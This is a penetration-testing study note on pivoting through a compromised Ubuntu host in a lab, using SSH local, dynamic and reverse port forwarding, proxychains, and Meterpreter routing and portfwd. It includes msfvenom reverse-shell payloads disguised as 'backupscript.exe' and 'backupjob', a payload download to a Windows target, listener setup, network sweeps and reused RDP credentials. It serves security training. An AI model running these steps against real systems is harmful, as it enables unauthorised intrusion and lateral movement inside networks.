@@ -1,0 +1,568 @@
+## Dynamic Port Forwarding with SSH and SOCKS Tunneling
+
+### Port Forwarding in context
+
+Port forwarding is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer  to provide interactive communication for the forwarded port. Different application layer protocols such as SSH and SOCKS can be used to encapsulate the forwarded traffic.
+
+### SSH Local Port Forwarding
+![[11.webp]]
+
+#### Scanning the Target
+```shell-session
+$ nmap -sT -p22,3306 10.129.202.64
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
+Nmap scan report for 10.129.202.64
+Host is up (0.12s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+3306/tcp closed mysql
+```
+
+A benefit of accessing MySQL locally with port forwarding is in case we want to execute a remote exploit.
+
+#### Executing the Local Port Forward
+```shell-session
+$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+```
+
+This will forward all traffic we send to port `1234` to `localhost:3306` on the ubuntu server.
+
+#### Confirming Port Forward with Netstat
+```shell-session
+$ netstat -antp | grep 1234
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
+tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh 
+```
+
+#### Confirming Port Forward with Nmap
+```shell-session
+$ nmap -v -sV -p1234 localhost
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
+NSE: Loaded 45 scripts for scanning.
+Initiating Ping Scan at 12:18
+Scanning localhost (127.0.0.1) [2 ports]
+Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
+Initiating Connect Scan at 12:18
+Scanning localhost (127.0.0.1) [1 port]
+Discovered open port 1234/tcp on 127.0.0.1
+Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
+Initiating Service scan at 12:18
+Scanning 1 service on localhost (127.0.0.1)
+Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
+NSE: Script scanning 127.0.0.1.
+Initiating NSE at 12:18
+Completed NSE at 12:18, 0.01s elapsed
+Initiating NSE at 12:18
+Completed NSE at 12:18, 0.00s elapsed
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.0080s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT     STATE SERVICE VERSION
+1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
+```
+
+#### Forwarding Multiple Ports
+```shell-session
+$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+```
+
+### Setting up to Pivot
+```shell-session
+ubuntu@WEB01:~$ ifconfig 
+
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
+        RX packets 35571  bytes 177919049 (177.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 10452  bytes 1474767 (1.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
+        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
+        RX packets 8251  bytes 1125190 (1.1 MB)
+        RX errors 0  dropped 40  overruns 0  frame 0
+        TX packets 1538  bytes 123584 (123.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 270  bytes 22432 (22.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 270  bytes 22432 (22.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+In this case there is one adapter connected to the internet (ens192), and another to a local network, if we want to scan this local network we will need to use dynamic port forwarding and pivot our packets via the Ubuntu server. We can do this by starting a SOCKS listener on our local host and then configure SSH to forward that traffic via SSH to the network after connecting to the attack host.
+
+This is called SSH tunneling over SOCKS proxy. SOCKS stands for Socket Secure, a protocol that helps communicate with servers where you have firewalls restrictions in place. The initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client side.
+
+This technique can be used to bypass firewalls. Another benefit is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. There are currently 2 types of SOCKS proxies. SOCKS4 which doesn't provide any authentication and UDP support, and SOCKS5 which does provide that.
+
+![[22.webp]]
+
+In the above example any data you send to port 9050 will be broadcasted to the entire 172.16.5.0/23 network.
+
+#### Enabling Dynamic Port Forwarding with SSH
+```shell-session
+$ ssh -D 9050 ubuntu@10.129.202.64
+```
+
+Now we can use a tool like `proxychains` to route any tool's packets over the port 9050, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains we can hide the IP address of the requesting host as well. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies.
+
+#### Checking /etc/proxychains.conf
+```shell-session
+$ tail -4 /etc/proxychains.conf
+
+# meanwile
+# defaults set to "tor"
+socks4 	127.0.0.1 9050
+```
+
+#### Using Nmap with Proxychains
+```shell-session
+$ proxychains nmap -v -sn 172.16.5.1-200
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
+Initiating Ping Scan at 12:30
+Scanning 10 hosts [2 ports/host]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+
+<SNIP>
+```
+
+This part is called SOCKS tunneling. An **important note** is that we can only perform a `full TCP connect scan` over proxychains, since proxychains can't understand partial packets.
+
+#### Enumerating the Windows Target through Proxycahins
+```shell-session
+$ proxychains nmap -v -Pn -sT 172.16.5.19
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
+Initiating Parallel DNS resolution of 1 host. at 12:33
+Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
+Initiating Connect Scan at 12:33
+Scanning 172.16.5.19 [1000 ports]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
+Discovered open port 445/tcp on 172.16.5.19
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
+Discovered open port 135/tcp on 172.16.5.19
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+Discovered open port 3389/tcp on 172.16.5.19
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
+Discovered open port 139/tcp on 172.16.5.19
+```
+
+### Using Metasploit with Proxychains
+```shell-session
+$ proxychains msfconsole
+```
+
+#### Using rdp_scanner Module
+```shell-session
+msf6 > search rdp_scanner
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner
+
+msf6 > use 0
+msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
+rhosts => 172.16.5.19
+msf6 auxiliary(scanner/rdp/rdp_scanner) > run
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+
+[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
+[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+#### Using xfreerdp with Proxychains
+```shell-session
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+
+## Remote/Reverse Port Forwarding with SSH
+
+Sometimes we might want to forward a local service to a remote port, for example in case of a reverse shell.
+
+![[33.webp]]
+
+For a Meterpreter shell we will create HTTPS using msfvenom, using the Ubuntu server's host IP address (172.16.5.129). We will use port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.
+
+### Creating a Windows Payload with msfvenom
+```shell-session
+$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+
+### Configuring and Starting the multi/handler
+```shell-session
+msf6 > use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+payload => windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8000
+lport => 8000
+msf6 exploit(multi/handler) > run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+```
+
+### Transferring Payload to Pivot Host
+```shell-session
+$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+
+backupscript.exe                                   100% 7168    65.4KB/s   00:00 
+```
+
+### Starting Python3 Webserver on Pivot Host
+```shell-session
+ubuntu@Webserver$ python3 -m http.server 8123
+```
+
+### Downloading Payload from Windows Target
+```powershell-session
+PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+Now we will use SSH to forward all traffic from `<targetIPaddress>:8080` to our attack host at `0.0.0.0:8000`. The `-vN` argument is for verbose mode and not prompt the login shell.
+
+### Using SSH -R
+```shell-session
+$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+```
+
+Now the payload can be executed from the Windows target, and we'll get a connection back to our machine.
+
+![[44.webp]]
+
+## Meterpreter Tunneling & Port Forwarding
+
+We can create a pivot with our Meterpreter session without relying on SSH port forwarding.
+
+### Creating a Payload for Ubuntu Pivot Host
+```shell-session
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+
+### Configuring & Starting the multi/handler
+```shell-session
+msf6 > use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8080
+lport => 8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+```
+
+### Executing the Playload on the Pivot Host
+```shell-session
+ubuntu@WebServer:~$ ls
+
+backupjob
+ubuntu@WebServer:~$ chmod +x backupjob 
+ubuntu@WebServer:~$ ./backupjob
+```
+
+### Meterpreter Session Establishment
+```shell-session
+[*] Sending stage (3020772 bytes) to 10.129.202.64
+[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
+meterpreter > pwd
+
+/home/ubuntu
+```
+
+The Windows target is on the 172.16.5.0/23 network, so we can perform a ping sweep on the network (assuming the firewall allows it). The below command will generate ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.
+
+### Ping Sweep
+```shell-session
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+[*] Performing ping sweep for IP range 172.16.5.0/23
+```
+
+We could also perform a ping sweep using a `for loop` directly on a target pivot host that will ping any device in the network range we specify.
+
+### Ping Sweep For Loop on Linux Pivot Hosts
+```shell-session
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+### Ping Sweep For Loop Using CMD
+```cmd-session
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+### Ping Sweep Using PowerShell
+```powershell-session
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+
+Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.
+
+In case ICMP is blocked by the firewall, we can perform a TCP scan with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit post-exploitation routing module `socks_proxy` to configure local proxy on our attack host. We will configure our SOCKS proxy for SOCKS version 4a. The following will start a listener on port 9050 and route all traffic received via our Meterpreter session.
+
+### Configuring MSF's SOCKS Proxy
+```shell-session
+msf6 > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+SRVHOST => 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+version => 4a
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  9050             yes       The port to listen on
+   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
+                                        5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+```
+
+#### Confirming Proxy Server is Running
+```shell-session
+msf6 auxiliary(server/socks_proxy) > jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+```
+
+After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on our compromised Ubuntu host.
+
+#### Adding a Line to proxychains.conf if Needed
+```shell-session
+socks4 	127.0.0.1 9050
+```
+
+Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
+
+Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
+
+#### Creating Routes with AutoRoute
+```shell-session
+msf6 > use post/multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 10.129.202.64
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+[*] Post module execution completed
+```
+
+It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
+
+```shell-session
+meterpreter > run autoroute -s 172.16.5.0/23
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.16.5.0/255.255.254.0...
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+[*] Use the -p option to list all active routes
+```
+
+After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.
+
+```shell-session
+meterpreter > run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
+```
+
+#### Testing Proxy & Routing Functionality
+```shell-session
+$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
+Initiating Parallel DNS resolution of 1 host. at 13:40
+Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
+Initiating Connect Scan at 13:40
+Scanning 172.16.5.19 [1 port]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
+Discovered open port 3389/tcp on 172.16.5.19
+Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
+Nmap scan report for 172.16.5.19 
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+```
+
+### Port Forwarding
+
+We can accomplish port forwarding with Meterpreter's `portfwd` module.
+
+#### Portfwd Options
+```shell-session
+meterpreter > help portfwd
+
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+    -R        Indicates a reverse port forward.
+```
+
+#### Creating Local TCP Relay
+```shell-session
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+```
+
+#### Connecting to Windows Target through localhost
+```shell-session
+$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+#### Netstat Output
+```shell-session
+Wildland4958@htb[/htb]$ netstat -antp
+
+tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
+```
+
+### Meterpreter Reverse Port Forwarding
+
+We will ask to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.
+
+#### Reverse Port Forwarding Rules
+```shell-session
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+
+#### Configuring & Starting multi/handler
+```shell-session
+meterpreter > bg
+
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
+LPORT => 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:8081 
+```
+
+### Compromising SQL01
+
+First used the module `use exploit/windows/mssql/mssql_payload` in Metasploit from the attack host.
+
+[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) was very helpful.
+
+Then checked the following site to escelate privileges to SYSTEM:
+https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=2355
